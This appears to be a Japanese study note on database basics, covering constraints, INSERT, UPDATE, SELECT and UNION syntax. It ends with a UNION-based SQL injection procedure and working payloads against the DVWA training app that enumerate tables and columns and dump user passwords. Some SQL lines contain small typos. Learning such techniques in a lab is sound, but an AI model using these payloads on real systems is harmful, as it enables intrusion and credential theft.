# データベース

- リレーショナル型：表に似ている。mysql、Oracle、microsoft sql server、acess
- 非リレーショナル型：分散型で、ACID原則に従うことを保証しない。MongoDb、Redis、HBase

## 制約の種類

1. 主キー制約（primary key）：そのフィールドが非NULLかつ一意であることを保証する。1つのテーブルに主キーは1つだけ存在でき、主キーはテーブル内のフィールドの一意識別子である
2. NOT NULL制約（not null）：フィールドが空でないことを保証する
3. UNIQUE制約（unique）：そのフィールドが一意であることを保証するが、NULLは許可される
4. 外部キー制約（foreign key）：あるテーブルに存在する別のテーブルの主キーまたは一意キーが、このテーブルの外部キーになる
5. デフォルト制約（default）：そのフィールドにデフォルト値があることを保証する

- 追加：`insert into 表名(键1,键2……) values(值1,值2……)`

  複数組のフィールド `insert into 表名(key1,key2……) values(value1,value2)(value3,value4)`

-  更新：`update 表名 set 键名='值' where 条件(列值)`

- 削除：

  物理削除：`delete from 表名 where 条件 `  

  論理削除

- 検索：

  `select *(列名) from 表名`

  `select 列 from 表 where 条件 `

  `select 列 from 表 by 某列 ASC(升序)/DESC（降序）`

​		`select GROUP_CONTACT(列) from 表 where`	クエリ結果を行形式で表示

​		`select 列 from 表 order by 数字`		表示するキー数。既存より大きいとエラー、小さければ正常に表示

​		`select 列 from 表 limit 5 `	先頭5行の表示制限

​	    `select 列 from 表 limit 5(偏移量)，10(显示行数) `	6～15行目の表示制限

​		`select 数字（其他任意内容）,数字（其他任意内容）…… `	表示位置に応じて入力内容を出力する。**データベースがエコーする列数は固定であり、表示位置を満たす場合にのみエコーされる**

## union

union キーワード。結合クエリで、2つの select 文を1つの文に統合し、1つの結果として表示する。

結合クエリでは、2つの select は同じフィールド数でなければならない（union は照会するテーブルの列数とフィールド型が一致することを要求する）



`union all` すべてのデータを直接まとめて結合する

`union` 結合後のデータを重複排除する



`information_schema`	フィールド情報を照会する

## インジェクション手順

1. データベースの種類を照会する（エラー、datebase（））
2. データベース名を調べる
3. テーブル名を調べる
4. 列名を調べる
5. 情報を取得する

## データベースの種類を調べる

`select * from 表名 where id='1' union select 1,database()`

## データベースのテーブル内容を照会する

`0' union select 1,table_name from information_schema.tables where table_schema='dvwa`

## 列名を調べる

`0' union select 1,group_concat(column_name) from information_schema.columns where table_name='users`

## 情報を調べる

`0' union select user,password from users#`
